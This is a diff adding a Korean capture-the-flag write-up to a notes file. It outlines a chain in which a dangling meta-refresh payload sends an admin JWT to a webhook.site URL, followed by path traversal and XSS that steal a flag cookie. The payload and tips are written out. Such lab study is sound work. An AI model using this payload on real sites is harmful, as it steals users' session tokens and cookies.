@@ -107,6 +107,27 @@ HackTheon 2026 plottergeist에서는 setup 값 `59,8,6`과 6px cell fingerprint�
 
 ## Web 특수 사례
 
+### Dreamhack Anyone can cook — CSP meta refresh token leak + CSPT JSON XSS
+
+구조:
+1. `/recipe`는 CSP가 있지만 recipe `ingredients`를 `innerHTML`로 렌더링하고, admin이면 delete form에 admin JWT hidden input을 붙인다.
+2. inline event/script는 CSP로 막히지만 `meta http-equiv=refresh` top navigation은 허용된다.
+3. `ingredients`에서 single-quote dangling meta refresh를 열고, `steps`에 `'`를 넣어 delete form 뒤에서 닫으면 admin JWT가 webhook URL에 실린다.
+4. `/api/recipe/update`는 현재 세션 role이 아니라 body의 admin JWT만 검증해 임의 recipe와 upload JSON을 unsanitized 값으로 수정한다.
+5. `/user?id=`는 서버에서 `parseInt()`로 유저 존재만 확인하고, 클라이언트는 raw id를 `/api/recipes/user/` 뒤에 붙여 fetch한다. `id=<uid>/../../../../uploads/<file>.json`로 CSPT가 된다.
+6. `/user`는 CSP가 없고 JSON `name`을 `innerHTML`에 넣어 최종 XSS로 `FLAG` 쿠키를 회수한다.
+
+핵심 payload:
+```html
+ingredients = </pre><meta http-equiv=refresh content='0;url=https://webhook.site/<uuid>?tok=
+steps = '
+```
+
+주의:
+- dangling quote를 닫지 않으면 meta element 자체가 생성되지 않아 요청이 안 나갈 수 있다.
+- 중간 form markup이 double quote만 쓰는지 확인하고 quote 종류를 고른다.
+- upload JSON에는 `ingredients` 원본이 남지만 `/user` sink는 `name`만 쓰므로, admin token으로 update를 먼저 성공시켜야 했다.
+
 ### Dreamhack PublicDocs — CDT wrong-dictionary mXSS
 
 구조:
